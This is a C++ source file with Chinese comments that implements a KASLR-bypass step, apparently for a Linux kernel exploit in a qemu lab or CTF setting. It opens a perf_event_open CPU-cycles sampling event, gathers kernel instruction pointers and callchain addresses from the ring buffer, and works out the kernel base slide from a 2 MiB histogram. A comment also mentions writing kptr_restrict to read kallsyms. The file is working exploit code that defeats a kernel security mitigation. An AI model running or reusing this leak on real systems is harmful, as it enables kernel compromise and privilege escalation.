#include <algorithm>
#include "tools.h"
#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include "const.h"
using std::cout;
static Print print("slide");

// 据群友提示，可直接写kptr_restrict从而读取kallsymbols，我没试过
// ★ 内置 perf 泄漏（KASLR slide）
std::vector<unsigned long> kaddr;

//筛选内核态指针
void perf_parse_samples(char *d, int ds, int &nokptr, int &usamp, int &ccerr) {
    kaddr.reserve(PERF_MAXP);
// 内核样本：misc=1，ip=内核地址，nr = 9 = 1 个 PERF_CONTEXT_KERNEL(0xffffffffffffff80) + 8 帧
// 用户样本：misc=2，ip=busybox地址(qemu实测0x441468…)，nr = 0
    int hs = sizeof(perf_event_header);
    //这个环形缓冲区的设计很阴间，边界情况先粗略判断：pos+hs < ds，后续时刻注意边界
    for (int pos = 0; pos+hs < ds && kaddr.size() < PERF_MAXP; ) {
        auto eh = (perf_event_header*)(d + pos);
        if (eh->type == PERF_RECORD_SAMPLE) {
            if (eh->misc == 1) {
                char* p = (char*)eh + hs;//这条数据起点
                char* end = (char*)eh + eh->size;//这条数据末尾
                unsigned long ip = 0;
                if (p + 8 <= end) {
                    ip = *(unsigned long*)p;
                    p += 8;
                }
                if (!is_kptr(ip)) ++nokptr;
                else if (kaddr.size() < PERF_MAXP) kaddr.push_back(ip);
                else return;
                unsigned long nr_cc = 0;
                if (p + 8 <= end) {
                    nr_cc = *(unsigned long*)p;
                    p += 8;
                }
                if (nr_cc > 9) ++ccerr;
                else {
                    p += 8;//跳过魔数
                    for (long c = 0; c < nr_cc && p+8 <= end; c++, p += 8) {
                        long v = *(long*)p;
                        if (!is_kptr(v)) ++nokptr;
                        else if (kaddr.size() < PERF_MAXP) kaddr.push_back(v);
                        else return;
                    }
                }
            }
            else if (eh->misc == 2) {//qemu可能混入用户态指针(约一半)
                ++usamp;
            }
        }
        if (eh->size == 0) {
            //预期缓冲区会写满（10万个事件不止32页），因为调用方没移动data_tail，所以内核会丢弃放不下的新事件，
            //读到0是因为缓冲区创建时清零，剩余空间不足一个事件
            return;
        }
        pos += eh->size;
    }
}

// 直方图
void perf_slide_from_samples() {
    std::ranges::sort(kaddr);

    unsigned long unit = 2*1024*1024;
    unsigned long base = kaddr[0] / unit * unit;//最低地址向下对齐2MiB
    std::vector<std::pair<unsigned long, unsigned long>> hist;//<左端点，数量>
    {
        int i = 0;
        for (auto &e: kaddr) {
            while (e >= base+unit*(i+1)) {
                ++i;
            }

            bool found = false;
            for (auto &p: hist) {
                if (p.first == base + unit*i) {
                    ++p.second;
                    found = true;
                    break;
                }
            }
            if (!found) {
                hist.emplace_back(base+unit*i, 1);
            }
        }
    }

    std::ranges::sort(hist, [](auto x, auto y) {
        return x.second > y.second;
    });

    // print("hist元素个数(有效区间数)：",hist.size());
    if (hist.empty()) {
        print("直方图没有数据");
        exit(1);
    }
    {
        unsigned long long sum = 0;
        for (auto &[x1, x2]: hist) {
            sum += x2;
        }
        if (sum != kaddr.size()) {
            print("总指针数/kaddr.size(应相等) ",sum," ",kaddr.size()," 代码有bug");
        }
        auto per = hist[0].second*100 / kaddr.size();
        print(per,"%的指针落在第一个桶，预期90%以上");
    }
    unsigned long text_real = hist[0].first + LINK_TEXTOFF;
    unsigned long slide = text_real - LINK_TEXT;

    print("slide≈",slide >> 30," GB (",ultohex(slide,true)," B)");
    //重要保险
    if ((slide & 0x1FFFFFULL) != 0) {
        print("slide 不是 2MiB 对齐 ⇒ 候选不可信");
        exit(1);
    }
    if ((slide < MIN_SLIDE || slide >= MAX_SLIDE) && slide != 0) {
        print("slide 不在 [64G,192G) 且 ≠ 0 ⇒ 候选不可信");
        exit(1);
    }
    if (text_real >= *std::ranges::min_element(kaddr) + unit) {
        print("候选 _text 高于采到的最低位内核地址2MiB及以上，不可信：");
        cout << "候选：" << std::hex << std::showbase << text_real << '\n'
        << "最低：" << *std::ranges::min_element(kaddr)
        << std::dec << std::noshowbase << '\n';
        exit(1);
    }
    kaslr_slide = slide;
}

// 建立事件：因为这东西太杂了，AI也讲不清楚，凑合用
int perf_open_strategy() {
    perf_event_attr a{};
    a.size = sizeof(perf_event_attr);
    a.type = PERF_TYPE_HARDWARE;//硬件事件
    a.config = PERF_COUNT_HW_CPU_CYCLES;//硬件事件下的时钟周期
    a.sample_period = 50000;//50000周期采样一次
    // 采样点排除用户代码
    a.exclude_user = 1;
    a.exclude_callchain_user = 1;
    a.exclude_hv = 1;//排除虚拟机陷入事件
    a.disabled = 1;//建立事件后，手动开始采集
    //影响环形缓冲区内，单位数据payload布局
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 8;//最大只采8层调用链
    int fd = (int)syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        print("perf事件PERF_COUNT_HW_CPU_CYCLES无法建立: ",strerror(errno));
        exit(1);
    }
    return fd;
    //已删除两种备选事件
}

void leak_slide() {
    //建事件
    int fd = perf_open_strategy();
    //建立收集数据的环形缓冲区
    auto sz = sysconf(_SC_PAGESIZE) * 33; // 1 头页 + 32 数据页（内核要 >= 1+2^n）
    auto b = mmap(nullptr, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (b == MAP_FAILED) {
        print("创建perf内存映射失败: ", strerror(errno));
        exit(1);
    }
    //开始收集
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (long i = 0; i < 100'000L; i++) {
        syscall(SYS_gettid);
    }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    //检查结果
    auto *h = (perf_event_mmap_page*)b;
    auto dh = h->data_head;
    __sync_synchronize();//头文件说读完data_head必须加内存屏障
    if (dh == 0) {
        print("内核没有往缓冲区写数据");
        exit(1);
    }
    int ds = (int)h->data_size;
    // print("data_size=",ds);
    char *d = (char*)b + h->data_offset;//数据区起点
    //提取样本中的内核指针
    int ccerr = 0, nokptr = 0, usamp = 0;
    perf_parse_samples(d, ds, nokptr, usamp, ccerr);
    munmap(b, sz);
    close(fd);
    print("内核样本=",kaddr.size()," callchain计数异常=",ccerr," 内核样本内非内核指针=",nokptr," 用户样本=",usamp);
    if (kaddr.empty()) {
        print("kaddr为空, 没采到内核地址");
        exit(1);
    }
    //分析样本，计算silde
    perf_slide_from_samples();
}